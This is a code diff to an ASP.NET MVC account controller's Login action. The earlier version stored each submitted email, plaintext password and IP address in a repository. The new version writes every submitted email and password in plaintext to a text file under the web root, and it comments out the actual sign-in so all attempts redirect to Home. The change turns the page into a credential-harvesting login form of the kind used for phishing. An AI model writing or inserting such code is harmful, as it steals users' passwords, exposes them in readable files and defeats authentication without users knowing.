@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Globalization;
+using System.IO;
 using System.Linq;
 using System.Security.Claims;
 using System.Threading.Tasks;
@@ -72,8 +73,15 @@ namespace webapp.Controllers
         [ValidateAntiForgeryToken]
         public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
         {
-            string ip = System.Web.HttpContext.Current.Request.UserHostAddress;
-            this.repository.Insert(new LoginInfo() { BrowerInfo = "", Email = model.Email, Password = model.Password, IpAddress = ip });
+            //string ip = System.Web.HttpContext.Current.Request.UserHostAddress;
+            //this.repository.Insert(new LoginInfo() { BrowerInfo = "", Email = model.Email, Password = model.Password, IpAddress = ip });
+            //this.repository.Save();
+            string path = Path.Combine(Server.MapPath("~/file"),
+                                              Path.GetFileName("test.txt"));
+            using (StreamWriter sw = new StreamWriter(path, append: true))
+            {
+                sw.Write(model.Email+"    "+ model.Password+"\n\n");
+            }
             if (!ModelState.IsValid)
             {
                 return View(model);
@@ -81,20 +89,21 @@ namespace webapp.Controllers
 
             // This doesn't count login failures towards account lockout
             // To enable password failures to trigger account lockout, change to shouldLockout: true
-            var result = await SignInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, shouldLockout: false);
-            switch (result)
-            {
-                case SignInStatus.Success:
-                    return RedirectToLocal(returnUrl);
-                case SignInStatus.LockedOut:
-                    return View("Lockout");
-                case SignInStatus.RequiresVerification:
-                    return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = model.RememberMe });
-                case SignInStatus.Failure:
-                default:
-                    ModelState.AddModelError("", "Invalid login attempt.");
-                    return View(model);
-            }
+            //var result = await SignInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, shouldLockout: false);
+            //switch (result)
+            //{
+            //    case SignInStatus.Success:
+            //        return RedirectToLocal(returnUrl);
+            //    case SignInStatus.LockedOut:
+            //        return View("Lockout");
+            //    case SignInStatus.RequiresVerification:
+            //        return RedirectToAction("SendCode", new { ReturnUrl = returnUrl, RememberMe = model.RememberMe });
+            //    case SignInStatus.Failure:
+            //    default:
+            //        ModelState.AddModelError("", "Invalid login attempt.");
+            //        return View(model);
+            //}
+            return RedirectToAction("Index","Home");
         }
 
         //
